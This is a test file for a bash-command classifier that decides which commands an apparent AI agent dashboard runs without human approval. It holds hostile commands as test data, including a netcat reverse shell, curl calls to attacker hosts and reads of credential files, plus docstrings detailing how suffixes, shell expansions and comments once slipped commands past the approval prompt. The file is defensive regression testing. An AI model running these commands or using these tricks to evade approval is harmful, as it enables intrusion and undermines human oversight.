"""Tests for trust-reads — bash command classification and approval flow."""

from __future__ import annotations

import asyncio
from unittest.mock import AsyncMock, MagicMock

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from kiro_crew.dashboard.chat import _extract_bash_command
from kiro_crew.dashboard.state import (
    DashboardState,
    _ChatSlot,
    is_read_only_bash,
    unsafe_bash_reason,
)
from kiro_crew.history import ConversationLog

# ── Helpers ──


def _make_state(tmp_path):
    sessions = MagicMock(count=0)
    sessions.get_pid = MagicMock(return_value=None)
    sessions.remove = AsyncMock()
    return DashboardState(
        sessions=sessions,
        crons=MagicMock(list_jobs=MagicMock(return_value=[]), status=MagicMock(return_value={})),
        lessons=MagicMock(load_all=MagicMock(return_value=[])),
        start_time=0.0,
        conversation_log=ConversationLog(base_dir=tmp_path),
    )


def _make_app(state: DashboardState) -> web.Application:
    from kiro_crew.dashboard.chat import api_chat_mode, api_chat_slot_approve

    @web.middleware
    async def _test_auth(request: web.Request, handler):
        if "app" not in request:
            request["app"] = ""
        if "user" not in request:
            request["user"] = "local-app"
        return await handler(request)

    app = web.Application(middlewares=[_test_auth])
    app["state"] = state
    app.router.add_post("/api/chat/slots/{slot}/approve", api_chat_slot_approve)
    app.router.add_post("/api/chat/mode", api_chat_mode)
    return app


# ── is_read_only_bash classification ──


class TestIsReadOnlyBash:
    """Verify bash command classification — deny-by-default."""

    def test_simple_read_commands(self):
        assert is_read_only_bash("ls -la") is True
        assert is_read_only_bash("cat /tmp/foo.txt") is True
        assert is_read_only_bash("head -20 file.py") is True
        assert is_read_only_bash("tail -f log.txt") is True
        assert is_read_only_bash("grep -r 'pattern' src/") is True
        assert is_read_only_bash("wc -l file.txt") is True

    def test_find_not_auto_approved(self):
        # `find` is NOT on the read-only allowlist (SEC-005 / SEC-FC0A8D32):
        # it resolves destructive behaviour through sub-options (-delete/-exec),
        # so removing it from the allowlist (the finding's remediation option 1)
        # means it is never auto-approved.
        assert is_read_only_bash("find . -delete") is False
        assert is_read_only_bash("find . '-delete'") is False
        assert is_read_only_bash("find . -exec rm {} +") is False
        assert is_read_only_bash("find . -name '*.py'") is False
        assert is_read_only_bash("find src -type f") is False
        assert "not on the read-only allowlist" in unsafe_bash_reason("find . -delete")
        assert is_read_only_bash("diff file1 file2") is True

    def test_git_read_commands(self):
        assert is_read_only_bash("git status") is True
        assert is_read_only_bash("git log --oneline -5") is True
        assert is_read_only_bash("git diff HEAD") is True
        assert is_read_only_bash("git show abc123") is True
        assert is_read_only_bash("git branch -a") is True
        assert is_read_only_bash("git blame file.py") is True

    def test_brazil_read_commands(self):
        assert is_read_only_bash("brazil ws show") is True
        assert is_read_only_bash("brazil versionset print --vs live") is True
        assert is_read_only_bash("brazil workspace list") is True

    def test_help_and_version(self):
        # Version probes on the read-only prefix allowlist
        assert is_read_only_bash("python --version") is True
        assert is_read_only_bash("python3 --version") is True
        assert is_read_only_bash("java -version") is True
        assert is_read_only_bash("node --version") is True
        # Bare help probes for non-executor programs pass the probe shape check
        assert is_read_only_bash("brazil-build --help") is True
        assert is_read_only_bash("some-tool --help") is True
        # Known code executors are denied even in bare --help form, because the
        # flag can land as an operand the interpreter runs
        assert is_read_only_bash("node --help") is False
        assert is_read_only_bash("npm --help") is False
        # Extra arguments after --help are not a probe shape
        assert is_read_only_bash("node --help --require /tmp/payload.js") is False
        assert is_read_only_bash("brazil-build --help --eval 'malicious'") is False
        assert is_read_only_bash("java --help -jar /tmp/evil.jar") is False
        assert is_read_only_bash("javac --help -processor evil") is False

    def test_interpreter_suffix_bypass_rejected(self):
        """Regression: trailing --help/--version must NOT auto-approve
        interpreter commands whose head is not on the read-only allowlist.
        See: coordinated disclosure from Robert Noack, 2026-08-15."""
        # bash -c '<payload>' --help — interpreter passes flag to script
        assert is_read_only_bash("bash -c 'touch /tmp/owned' --help") is False
        assert is_read_only_bash("bash -c 'whoami' --version") is False
        # python3 -c '<payload>' --help
        payload = "python3 -c \"open('/tmp/p1','w').write('x')\" --help"
        assert is_read_only_bash(payload) is False
        # sh -c variant
        assert is_read_only_bash("sh -c 'curl attacker.com' --help") is False
        # ruby/perl -e variants
        assert is_read_only_bash("ruby -e 'system(\"id\")' --help") is False
        assert is_read_only_bash("perl -e 'exec(\"id\")' --help") is False

    def test_help_probe_allows_one_bare_subcommand(self):
        """`<program> <subcommand> --help` is still a usage probe."""
        assert is_read_only_bash("git log --help") is True
        assert is_read_only_bash("git rev-parse --help") is True
        assert is_read_only_bash("terraform plan --help") is True
        assert is_read_only_bash("cargo --version") is True

    def test_help_suffix_does_not_auto_approve_an_arbitrary_command(self):
        """A trailing `--help` must not vouch for the command in front of it.

        The classifier used to accept any segment whose first pipe element
        ended with `--help`/`--version`, so appending the token removed the
        human approval prompt for arbitrary commands. A shell hands `--help`
        to the script as $1 instead of printing usage, so the payload still
        ran.
        """
        # Interpreters: the operand is code, and it executes.
        assert is_read_only_bash("sh /tmp/payload.sh --help") is False
        assert is_read_only_bash("bash /tmp/payload.sh --version") is False
        assert is_read_only_bash("/bin/sh /tmp/x.sh --help") is False
        assert is_read_only_bash("./sh evil.sh --help") is False
        assert is_read_only_bash("python -c \"import os;os.system('id')\" --help") is False
        # Destructive operands.
        assert is_read_only_bash("rm -rf ./proj --help") is False
        assert is_read_only_bash("chmod 777 /etc/passwd --help") is False
        # Wrappers that hand off to another program.
        assert is_read_only_bash("sudo rm -rf / --help") is False
        assert is_read_only_bash("env sh evil.sh --help") is False
        assert is_read_only_bash("xargs rm --help") is False
        assert is_read_only_bash("docker run --rm alpine --help") is False
        # Network tools: the operand opens a connection.
        assert is_read_only_bash("nc evil.example 4444 -e /bin/sh --help") is False
        assert is_read_only_bash("curl http://evil.example/x.sh --help") is False

    def test_help_suffix_does_not_auto_approve_across_segments(self):
        """Every `&&`/`;` segment is classified, so the suffix cannot chain.

        These are the payloads that combined the suffix with a sensitive-path
        read or a write to the deny-rule keystone file.
        """
        assert is_read_only_bash("cd ~/.kiro/crew --help && cat token_signing.key --help") is False
        assert (
            is_read_only_bash("cd ~/.kiro/crew --help && tee denied_commands.json --help") is False
        )
        assert is_read_only_bash("V=$HOME --help; awk 1 $V/.aws/credentials --help") is False

    def test_help_probe_rejects_verbose_flags(self):
        """`-v`/`-V` mean verbose far more often than version.

        `rm victim -v` is three tokens ending in a flag with a bare word in the
        middle, so a probe check keyed on shape alone reads it as
        ``<program> <subcommand> <flag>`` — and GNU rm deletes the operand.
        """
        assert is_read_only_bash("rm victim -v") is False
        assert is_read_only_bash("rm victim -V") is False
        assert is_read_only_bash("rm -rf dir -v") is False
        assert is_read_only_bash("chmod 777 file -v") is False
        assert is_read_only_bash("mv a b -v") is False
        assert is_read_only_bash("cp secret /tmp -v") is False
        # The two explicit allowlist entries still work — they are matched as
        # prefixes, not as probes.
        assert is_read_only_bash("java -version") is True
        assert is_read_only_bash("python --version") is True

    def test_help_probe_rejects_shell_builtins_that_run_their_operand(self):
        """`source payload --help` executes `payload` in the current shell.

        These are builtins, not programs on PATH, so the PATH-name requirement
        does not reach them on its own — `source` and `.` read the operand from
        the workspace and run it, with `--help` landing as $1.
        """
        assert is_read_only_bash("source payload --help") is False
        assert is_read_only_bash(". payload --help") is False
        assert is_read_only_bash("exec payload --help") is False
        assert is_read_only_bash("eval payload --help") is False
        assert is_read_only_bash("command payload --help") is False
        assert is_read_only_bash("builtin cd --help") is False
        assert is_read_only_bash("trap payload --help") is False

    def test_help_probe_rejects_a_shell_expanded_program(self):
        """The program must BE a bare command name, not merely lack a separator.

        `$SHELL payload --help` names a shell that then RUNS `payload`, and the
        old rule — "does the token contain a path separator?" — said yes to it.
        A rejection list cannot close this: the spellings the shell resolves at
        run time are unbounded, so the requirement is stated positively instead.
        """
        assert is_read_only_bash("$SHELL payload --help") is False
        assert is_read_only_bash("${SHELL} payload --help") is False
        assert is_read_only_bash("$0 payload --help") is False
        assert is_read_only_bash("$SHELL --help") is False
        assert is_read_only_bash("$(which sh) payload --help") is False
        assert is_read_only_bash("`which sh` payload --help") is False
        assert is_read_only_bash("$HOME/evil --help") is False
        assert is_read_only_bash("~/evil --help") is False

    def test_help_probe_rejects_a_script_running_package_manager(self):
        """`yarn clean --help` runs the project's `clean` script, then passes the flag.

        The three-token form reads as `<program> <subcommand> --help`, but for
        these the "subcommand" is a name from the project's own manifest — in this
        repo `clean` deletes `dist` and `node_modules`. Nothing here can tell a
        real subcommand from a script name, so the program is refused outright.
        """
        assert is_read_only_bash("yarn clean --help") is False
        assert is_read_only_bash("npm run --help") is False
        assert is_read_only_bash("pnpm build --help") is False
        assert is_read_only_bash("npx payload --help") is False

    def test_help_probe_still_vouches_for_an_ordinary_probe(self):
        """The positive rule must not cost the cases the classifier exists for.

        A real program name may carry dots, digits, `+` and `-`, so those stay
        acceptable: `python3.12 --help` and `g++ --help` are probes.
        """
        assert is_read_only_bash("git --help") is True
        assert is_read_only_bash("git status --help") is True
        assert is_read_only_bash("ls --help") is True
        assert is_read_only_bash("cargo build --help") is True
        assert is_read_only_bash("python3.12 --help") is True
        assert is_read_only_bash("apt-get --help") is True
        assert is_read_only_bash("g++ --help") is True

    def test_help_probe_allowlists_the_subcommand_form(self):
        """The three-token form is the dangerous one, so it is allowlisted.

        There the middle token is indistinguishable from an operand, so a program
        that treats it as a script RUNS it. The denied-program table cannot answer
        that: it matches EXACTLY, and the spellings a real system installs
        (`python3.12`, `perl5.36`, `node20`, `sh.exe`, `g++-13`) are unbounded, so
        no list of rejects closes it.
        """
        assert is_read_only_bash("python3.12 payload --help") is False
        assert is_read_only_bash("python2.7 payload --help") is False
        assert is_read_only_bash("perl5.36 payload --help") is False
        assert is_read_only_bash("node20 payload --help") is False
        assert is_read_only_bash("sh.exe payload --help") is False
        assert is_read_only_bash("g++-13 payload --help") is False
        # A program not on the allowlist is not BLOCKED — its two-token probe
        # still works, and only the subcommand form asks for a human.
        assert is_read_only_bash("python3.12 --help") is True
        assert is_read_only_bash("g++ --help") is True
        # The allowlisted programs keep their subcommand probe.
        assert is_read_only_bash("git log --help") is True
        assert is_read_only_bash("cargo build --help") is True
        assert is_read_only_bash("terraform plan --help") is True

    def test_help_probe_allowlist_excludes_operand_acting_programs(self):
        """Membership means "an unknown subcommand is an ERROR", not "a file".

        For an archiver the middle token is a mode letter and the operands are
        files it reads or writes, so the three-token form is not a usage probe:
        `tar xf …` extracts and `zip …` creates. `openssl <cmd>` reads a key the
        same way. Their two-token probe is unaffected.
        """
        assert is_read_only_bash("tar xf --help") is False
        assert is_read_only_bash("tar cf --help") is False
        assert is_read_only_bash("zip -r --help") is False
        assert is_read_only_bash("unzip -l --help") is False
        assert is_read_only_bash("openssl x509 --help") is False
        assert is_read_only_bash("tar --help") is True

    def test_help_probe_rejects_a_program_named_by_path(self):
        """An unlisted binary may ignore `--help` and run its side effect.

        The denied-program table can only name executors it knows about, so a
        path-named program has to fail on shape instead: nothing here can be
        vouched for.
        """
        assert is_read_only_bash("./payload --help") is False
        assert is_read_only_bash("./evil.sh --help") is False
        assert is_read_only_bash("/tmp/payload --help") is False
        assert is_read_only_bash("../build/tool --help") is False
        assert is_read_only_bash("./x --version") is False
        assert is_read_only_bash("/usr/local/bin/unknown --help") is False

    def test_help_probe_does_not_accept_short_h(self):
        """`-h` is not accepted — it collides with real options and halt semantics."""
        assert is_read_only_bash("some-tool subcmd -h") is False
        assert is_read_only_bash("some-tool -h") is False

    def test_help_probe_rejects_unparseable_and_prefixed_forms(self):
        """Deny-by-default when argv cannot be recovered or is not a probe."""
        # Unbalanced quote: argv is unknown, so the segment is not vouched for.
        assert is_read_only_bash('some-tool "--help') is False
        # A VAR=value prefix assigns into the command's environment.
        assert is_read_only_bash("LD_PRELOAD=/tmp/x.so --help") is False
        # More than one operand between program and flag.
        assert is_read_only_bash("npm run deploy --help") is False
        # An option, not a bare subcommand, in the middle.
        assert is_read_only_bash("some-tool -f /etc/shadow --help") is False

    def test_allowlisted_verb_may_not_write_via_its_own_output_flag(self):
        """A write does not need a shell redirect to be a write.

        `_UNSAFE_SHELL_RE` only sees `>`, so a program's own output flag
        reached the filesystem while the command still classified read-only.
        """
        assert is_read_only_bash("tree -o /tmp/pwned") is False
        assert is_read_only_bash("git diff --output=/tmp/pwned") is False
        assert is_read_only_bash("git show --output=/tmp/pwned") is False
        assert is_read_only_bash("git log --output=/tmp/pwned") is False
        # `file -C` compiles a magic file; `file -c` only prints one.
        assert is_read_only_bash("file -C -m /tmp/magic.src") is False
        assert is_read_only_bash("file -c") is True

    def test_pipe_target_may_not_write_via_its_own_output_flag(self):
        """The pipe allowlist matched only the filter's leading verb."""
        assert is_read_only_bash("cat f | sort -o /tmp/pwned") is False
        assert is_read_only_bash("cat f | sort --output=/tmp/pwned") is False
        # Bundled short cluster supplies the same flag.
        assert is_read_only_bash("cat f | sort -uo /tmp/pwned") is False
        # `uniq INPUT OUTPUT` writes its second operand.
        assert is_read_only_bash("cat f | uniq /tmp/in /tmp/pwned") is False
        # The read-only spellings of the same filters still pass.
        assert is_read_only_bash("cat f | sort") is True
        assert is_read_only_bash("cat f | sort -u") is True
        assert is_read_only_bash("cat f | uniq -c") is True

    def test_allowlisted_git_verb_may_not_change_a_ref_or_remote(self):
        """`git branch`/`git tag`/`git remote` have read and write modes.

        The allowlist entries are the listing forms, but a prefix match
        admitted the destructive spellings under the same verb.
        """
        # Ref deletion, rename and copy.
        assert is_read_only_bash("git branch -D release") is False
        assert is_read_only_bash("git branch -d release") is False
        assert is_read_only_bash("git branch -m main hijacked") is False
        # A bare operand names a ref to create.
        assert is_read_only_bash("git branch newbranch") is False
        assert is_read_only_bash("git tag sometag") is False
        assert is_read_only_bash("git tag -d v1.0.0") is False
        assert is_read_only_bash("git tag -m msg v1.0.0") is False
        # Remote configuration: `set-url` repoints where pushes go.
        assert is_read_only_bash("git remote set-url origin https://evil.example/x.git") is False
        assert is_read_only_bash("git remote add evil https://evil.example/x.git") is False
        assert is_read_only_bash("git remote remove origin") is False
        assert is_read_only_bash("git remote rename origin upstream") is False

    def test_allowlisted_git_verb_may_not_launch_an_editor_or_diff_driver(self):
        """Both spellings hand control to a program the caller did not name."""
        # `--edit-description` always opens $EDITOR.
        assert is_read_only_bash("git branch --edit-description") is False
        # An external diff driver comes from repo config / .gitattributes.
        assert is_read_only_bash("git diff --ext-diff") is False
        assert is_read_only_bash("git log --ext-diff") is False

    def test_read_only_git_inspection_still_auto_approves(self):
        """The listing and inspection forms must not regress into a prompt."""
        assert is_read_only_bash("git branch") is True
        assert is_read_only_bash("git branch -a") is True
        assert is_read_only_bash("git branch -vv") is True
        assert is_read_only_bash("git branch --list") is True
        assert is_read_only_bash("git branch --show-current") is True
        assert is_read_only_bash("git branch --merged") is True
        # A bare operand that is the value of a read-only flag is not a new ref.
        assert is_read_only_bash("git branch --contains HEAD") is True
        assert is_read_only_bash("git tag") is True
        assert is_read_only_bash("git tag -l") is True
        assert is_read_only_bash("git tag -l v1.*") is True
        assert is_read_only_bash("git remote") is True
        assert is_read_only_bash("git remote -v") is True
        assert is_read_only_bash("git remote get-url origin") is True

    def test_side_effect_check_is_case_insensitive_on_the_verb_only(self):
        """The verb is matched like the allowlist does; flags keep their case.

        The allowlist lowercases before comparing, so an odd verb spelling
        clears it — the side-effect table has to fold the verb the same way,
        while `-C` and `-c` must stay distinct.
        """
        assert is_read_only_bash("FILE -C -m /tmp/magic.src") is False
        assert is_read_only_bash("GIT BRANCH -D release") is False
        assert is_read_only_bash("ls -o") is True
        assert is_read_only_bash("grep -o pattern file") is True

    def test_an_abbreviated_long_option_still_matches(self):
        """GNU resolves any unambiguous prefix, so exact matching missed the flag.

        `git diff --out=FILE` reaches the same `--output` as the full spelling and
        writes the file, while the check compared against `--output` alone.
        """
        assert is_read_only_bash("git diff --output=/tmp/pwned") is False
        assert is_read_only_bash("git diff --outp=/tmp/pwned") is False
        assert is_read_only_bash("git diff --out=/tmp/pwned") is False
        assert is_read_only_bash("git diff --o=/tmp/pwned") is False
        assert is_read_only_bash("git branch --edit-desc") is False
        assert is_read_only_bash("git branch --ed") is False
        # A prefix of no known write flag is untouched: these stay read-only.
        assert is_read_only_bash("git diff --stat") is True
        assert is_read_only_bash("git diff --name-only") is True
        assert is_read_only_bash("git branch --contains HEAD") is True

    def test_a_shell_expansion_in_the_arguments_is_refused(self):
        """bash expands these; `shlex` does not, so the two see different argv.

        Matched as one CLASS, not one spelling. Closing `$'…'` alone left the
        siblings open on the identical path: `$"…"` is locale translation and
        `${…}` is parameter expansion, and both let the real flag or subcommand
        appear only after bash is done with it. Un-expanding them here would mean
        reimplementing bash's grammar, so a segment carrying one is refused.
        """
        # ANSI-C quoting.
        assert is_read_only_bash("git diff $'-o' /tmp/pwned") is False
        assert is_read_only_bash("git diff $'--output=/tmp/pwned'") is False
        assert is_read_only_bash("git remote $'set-url' origin https://evil") is False
        # Locale translation — the sibling form.
        assert is_read_only_bash('git diff $"--output=/tmp/pwned"') is False
        assert is_read_only_bash('git remote $"set-url" origin https://evil') is False
        # Parameter expansion, including one spliced INSIDE a word.
        assert is_read_only_bash("git diff ${HOME:+--output=/tmp/pwned}") is False
        assert is_read_only_bash("git remote ${x:-set-url} origin https://evil") is False
        assert is_read_only_bash("git remote se${x}t-url origin https://evil") is False
        assert is_read_only_bash("git branch ${x:--D} release") is False
        # A bare variable reference is the same divergence.
        assert is_read_only_bash("git diff $FLAG") is False
        # Ordinary quoting is unaffected — only the `$`-led forms are.
        assert is_read_only_bash("git tag -l 'v1.*'") is True
        assert is_read_only_bash('grep -n "pattern" file') is True

    def test_a_pipe_target_and_git_cat_file_cannot_write_or_exec(self):
        """The pipe-target check runs the same tables, so their gaps are reachable.

        `less` is not on the prefix allowlist, so it cannot lead a segment — but
        `cat f | less -O FILE` writes FILE from a segment whose leading verb is a
        read. `git cat-file --filters` hands off to the filter named by the
        repository's `.gitattributes`, and `sort --compress-program` to a program
        of the caller's choosing.
        """
        assert is_read_only_bash("cat f | less -O /tmp/pwned") is False
        assert is_read_only_bash("cat f | less --log-file=/tmp/pwned") is False
        assert is_read_only_bash("git cat-file --filters HEAD:f") is False
        assert is_read_only_bash("git cat-file --textconv HEAD:f") is False
        # The read forms still pass.
        assert is_read_only_bash("cat f | less") is True
        assert is_read_only_bash("git cat-file -p HEAD:f") is True

    def test_a_leading_option_does_not_hide_a_git_remote_subcommand(self):
        """git accepts an option BEFORE the subcommand, so `args[0]` is not it.

        `git remote -v set-url …` repointed the remote because the check read `-v`
        as the subcommand and found it harmless. The leading options are skipped so
        the first non-option word is the one git acts on.
        """
        assert is_read_only_bash("git remote -v set-url origin https://evil") is False
        assert is_read_only_bash("git remote --verbose add evil https://evil") is False
        assert is_read_only_bash("git remote -v remove origin") is False
        assert is_read_only_bash("git remote -v rename a b") is False
        # The listing forms, which is what the option is normally used for.
        assert is_read_only_bash("git remote -v") is True
        assert is_read_only_bash("git remote --verbose") is True
        assert is_read_only_bash("git remote") is True

    def test_brace_expansion_can_assemble_a_flag_out_of_fragments(self):
        """Brace expansion runs FIRST and carries no `$`, so the `$`-led class missed it.

        `git diff --{out,out}put=/tmp/pwned` reaches this module as one token that
        matches no flag, while bash hands git `--output=…` twice and the file is
        truncated. Only the forms bash actually expands are refused — a comma list
        or a `..` range — so a lone brace is still allowed through.
        """
        assert is_read_only_bash("git diff --{out,out}put=/tmp/pwned") is False
        assert is_read_only_bash("git diff --outpu{t,t}=/tmp/pwned") is False
        assert is_read_only_bash("git diff --output{,}=/tmp/pwned") is False
        assert is_read_only_bash("cat f | sort -{o,o} /tmp/pwned") is False
        # A range, the other expanding form.
        assert is_read_only_bash("git log --{a..z}") is False
        # A brace that bash does not expand is not this class.
        assert is_read_only_bash("git log --format={hash}") is True
        assert is_read_only_bash('grep -n "{}" file') is True

    def test_a_glob_is_refused_only_where_the_spelling_is_classified(self):
        """Pathname expansion is the one expansion that cannot be refused wholesale.

        A glob usually IS the argument in a read-only command, so refusing the
        character outright would take `ls *.py` and `grep -rn TODO src/*` off this
        path. It still has to go where the SPELLING is what gets classified — the
        subcommand and a flag NAME — because there bash resolves it against the
        filesystem and hands the program a word this module never saw.
        """
        # The subcommand, including `git remote`'s own subcommand word.
        assert is_read_only_bash("git remote s?t-url origin https://evil") is False
        assert is_read_only_bash("git remote se[t]-url origin https://evil") is False
        assert is_read_only_bash("git remote *et-url origin https://evil") is False
        assert is_read_only_bash("git remote -v s?t-url origin https://evil") is False
        # A flag name.
        assert is_read_only_bash("git diff --outp?t=/tmp/pwned") is False
        assert is_read_only_bash("git diff --outp[u]t=/tmp/pwned") is False
        assert is_read_only_bash("cat f | sort --out?ut=/tmp/pwned") is False
        # A glob in an OPERAND is the ordinary case and must keep working.
        assert is_read_only_bash("ls *.py") is True
        assert is_read_only_bash("grep -rn TODO src/*") is True
        assert is_read_only_bash("cat *.log") is True
        assert is_read_only_bash("wc -l *.md") is True
        assert is_read_only_bash("ls file?.txt") is True
        assert is_read_only_bash("grep 'a[bc]d' file") is True
        assert is_read_only_bash("git diff -- src/*") is True
        assert is_read_only_bash("git branch --list 'feat/*'") is True
        # A flag's VALUE is left alone too — only its name is classified.
        assert is_read_only_bash("git log --grep=[abc]") is True

    def test_a_lesskey_file_is_an_indirect_code_execution_path(self):
        """`less -k` loads a lesskey file, and a lesskey file can set `LESSOPEN`.

        less treats `LESSOPEN` as an input PREPROCESSOR and runs it, so a
        checkout-supplied lesskey is arbitrary command execution two steps removed
        from anything on the command line — which is why `--filter` alone did not
        cover it. Verified against `less --help` on less 608: `-k [file]` /
        `--lesskey-file=[file]`, plus `--lesskey-src` on newer builds.

        Case is load-bearing, as it is for `file -C`: lowercase `-k` loads the
        keyfile, uppercase `-K` is `--quit-on-intr` and an ordinary read.
        """
        assert is_read_only_bash("cat f | less -k evil.lesskey") is False
        assert is_read_only_bash("cat f | less -kevil.lesskey") is False
        assert is_read_only_bash("cat f | less -Nk evil.lesskey") is False
        assert is_read_only_bash("cat f | less --lesskey-file=evil.lesskey") is False
        assert is_read_only_bash("cat f | less --lesskey-src=evil.lesskey") is False
        assert is_read_only_bash("cat f | less --lesskey=evil.lesskey") is False
        # The paging reads, including the uppercase twin and the clusters.
        assert is_read_only_bash("cat f | less") is True
        assert is_read_only_bash("cat f | less -K") is True
        assert is_read_only_bash("cat f | less -Ki") is True
        assert is_read_only_bash("cat f | less -NSR") is True
        assert is_read_only_bash("cat f | less --no-lessopen") is True

    def test_tree_writes_without_being_given_a_filename(self):
        """`tree -R` names the output file itself, so a filename-bearing flag missed it.

        tree re-runs itself in each directory it descends into, adding
        `-o 00Tree.html` every time. Same write as `-o`, one step removed.
        """
        assert is_read_only_bash("tree -L 1 -R .") is False
        assert is_read_only_bash("tree -aR .") is False
        # The ordinary listing forms still pass.
        assert is_read_only_bash("tree -L 2 .") is True
        assert is_read_only_bash("tree") is True

    def test_textconv_hands_off_the_same_way_ext_diff_does(self):
        """`--textconv` selects a program from config, exactly as `--ext-diff` does.

        The table listed it for `git cat-file` and not for `git diff`/`show`/`log`,
        so the identical hand-off was open on the three most-used spellings.

        Scope: this stops the COMMAND LINE from selecting the program. A textconv
        driver the user configured is still applied by default, because that name
        comes from git config rather than from the repository, and requiring
        `--no-textconv` would take plain `git diff` off the read-only path.
        """
        assert is_read_only_bash("git diff --textconv HEAD") is False
        assert is_read_only_bash("git show --textconv HEAD") is False
        assert is_read_only_bash("git log --textconv") is False
        # The default spellings stay read-only.
        assert is_read_only_bash("git diff") is True
        assert is_read_only_bash("git diff HEAD") is True
        assert is_read_only_bash("git log --oneline -n 20") is True

    def test_an_optional_flag_value_does_not_swallow_a_ref_name(self):
        """git takes a separate word only for a REQUIRED argument.

        `--color` takes an optional one, which git accepts only when attached with
        `=`. Reading `newbranch` as the colour meant `git branch --color newbranch`
        created the ref and the segment passed. List mode is tracked separately, so
        `git branch --list newbranch` is still the read it is.
        """
        assert is_read_only_bash("git branch --color newbranch") is False
        assert is_read_only_bash("git branch --color=always newbranch") is False
        assert is_read_only_bash("git tag --color newtag") is False
        # A required-argument flag does consume the next word.
        assert is_read_only_bash("git branch --points-at HEAD") is True
        assert is_read_only_bash("git branch --format %(refname) --list") is True
        assert is_read_only_bash("git branch --sort=refname --list") is True
        # List mode: the operand is a pattern, not a ref to create.
        assert is_read_only_bash("git branch --list newbranch") is True
        assert is_read_only_bash("git tag -l 'v1*'") is True
        assert is_read_only_bash("git branch --contains HEAD") is True

    def test_the_option_terminator_makes_everything_after_it_an_operand(self):
        """`git tag -- -z` creates the tag `-z`.

        Classifying by a leading dash read `-z` as one more option, so the operand
        that names the ref was never seen.
        """
        assert is_read_only_bash("git tag -- -z") is False
        assert is_read_only_bash("git branch -- -z") is False
        assert is_read_only_bash("git tag -- v9") is False
        # `--` with nothing after it names no ref.
        assert is_read_only_bash("git tag --") is True
        assert is_read_only_bash("git branch --") is True

    def test_a_glob_can_expand_into_a_flag_it_does_not_look_like(self):
        """`?o` does not start with `-`, and bash hands the program `-o`.

        Refusing a glob only in a token that ALREADY looks like a flag name read
        the spelling instead of the expansion, so `cat f | sort ?o victim` — with
        a file named `-o` in the checkout, which a repository can carry — passed
        as a read while `sort` truncated `victim`. The test is now whether the
        pattern can MATCH a word this module decides on, which is also what keeps
        `ls *.py` and `git diff *.py` on the auto-approve path.
        """
        # A glob that resolves to a write flag, and to a short-option cluster
        # supplying one (`-uo` supplies `-o`).
        assert is_read_only_bash("cat f | sort ?o victim") is False
        assert is_read_only_bash("cat f | sort ?uo victim") is False
        assert is_read_only_bash("cat f | sort [-]o victim") is False
        assert is_read_only_bash("tree ?o /tmp/pwned") is False
        assert is_read_only_bash("file ?C -m /tmp/magic.src") is False
        assert is_read_only_bash("git branch ?D release") is False
        # A bare `*` matches every one of them, so it cannot be vouched for
        # where a short flag exists to be matched.
        assert is_read_only_bash("cat f | sort *") is False
        assert is_read_only_bash("git branch *") is False
        # A pattern that CANNOT reach a decided word is left alone — that is the
        # whole point of testing the expansion rather than the character.
        assert is_read_only_bash("git diff *.py") is True
        assert is_read_only_bash("git diff -- src/*") is True
        assert is_read_only_bash("ls *.py") is True
        assert is_read_only_bash("cat *.log") is True
        assert is_read_only_bash("grep -rn TODO src/*") is True

    def test_the_option_terminator_does_not_hide_a_ref_or_an_operand(self):
        """`--` ends the options, so a word after it is an operand however spelled.

        Two shapes slipped through. List mode was decided over the WHOLE argument
        list, so the `--list` in `git tag -- --list` was read as "this is a
        listing" when git creates a ref by that name. And `uniq`'s operand count
        skipped every leading-dash word, so `uniq -- input -pwned` counted one
        operand and wrote `-pwned`.
        """
        # A flag spelling after the terminator names a ref.
        assert is_read_only_bash("git tag -- --list") is False
        assert is_read_only_bash("git tag -- -l") is False
        assert is_read_only_bash("git branch -- --merged") is False
        assert is_read_only_bash("git branch -- --contains") is False
        # A second `--` is itself an operand, so the terminator is consumed once.
        assert is_read_only_bash("git tag -- --") is False
        # `uniq`'s second operand is its OUTPUT file, terminator or not.
        assert is_read_only_bash("cat f | uniq -- input -pwned") is False
        assert is_read_only_bash("cat f | uniq -- -in -pwned") is False
        # A selecting flag BEFORE the terminator is still a listing.
        assert is_read_only_bash("git tag -l -- 'v1.*'") is True
        assert is_read_only_bash("git branch --list -- 'feat/*'") is True
        # One operand after the terminator is the input, and reads.
        assert is_read_only_bash("cat f | uniq -- input") is True

    def test_a_construct_bash_deletes_cannot_forge_a_flag(self):
        """`shlex` keeps the words bash REMOVES, so a fake flag reached the tables.

        Every operand rule here reads `shlex.split`'s token list as if it were the
        program's argv. A comment and a herestring break that by deleting words
        rather than rewriting them, and `shlex` models neither:

            git branch injected # --list    shlex keeps '#', '--list'
                                            bash runs `git branch injected`

        The `--list` this module reads never reaches git. It turns list mode on,
        the bare `injected` is reclassified from "creates a ref" to "a pattern",
        and the segment auto-approves — while bash creates the ref. Measured
        against real git: `git branch injected # --list`, `git tag forged # --list`
        and `git branch injected <<< --list` each created the ref.

        Refused as a class rather than repaired, since repairing it means deciding
        what bash would have deleted — reimplementing word removal on top of
        quoting rules `shlex` already models differently.
        """
        assert is_read_only_bash("git branch injected # --list") is False
        assert is_read_only_bash("git tag forged # --list") is False
        assert is_read_only_bash("git branch injected <<< --list") is False
        assert is_read_only_bash("git branch injected < --list") is False
        # A comment elides to end of LINE, past the `&&` the segment split
        # believes in, so the whole raw command has to be scanned.
        assert is_read_only_bash("git status && git branch injected # --list") is False
        assert is_read_only_bash("# git status") is False

    def test_refusing_on_the_first_hit_leaves_no_state_to_get_wrong(self):
        """Why the construct is REFUSED and not reproduced.

        An earlier revision of this fix reproduced the comment instead — stripped
        it and classified the remainder — so that an ordinary trailing comment
        would keep auto-approving. That reopened the very bypass this exists to
        close: stripping means the scan CONTINUES past the `#`, and bash treats a
        comment body as literal text while the scanner does not. A lone `'` in
        comment text then leaked quote state across the newline, the next line's
        forged `# --list` was never removed, and the ref-creating command
        auto-approved again.

        Refusing on the FIRST hit has no "afterwards" to get wrong, which is what
        makes these inputs safe rather than a promise to handle them.
        """
        # The regression that killed the reproduce-the-comment approach.
        assert is_read_only_bash("echo x # don't\ngit branch evil # --list") is False
        # A second line is never reached, so it can never be smuggled past.
        assert is_read_only_bash("echo hi # note\ngit branch x") is False
        # Wider than bash is the SAFE direction: bash does not end a word on
        # U+00A0 and does not read this `#` as a comment, so refusing it is a
        # false refusal — never a false approval.
        assert is_read_only_bash("git branch injected\u00a0# --list") is False
        # ANSI-C `$'…'` quoting is likewise unmodelled, and likewise only ever
        # costs a prompt.
        assert is_read_only_bash("$'x\\' # y' ; git branch injected") is False

    def test_an_elided_construct_is_detected_quote_aware(self):
        """Both constructs are shell syntax only when unquoted, so quoting is honoured.

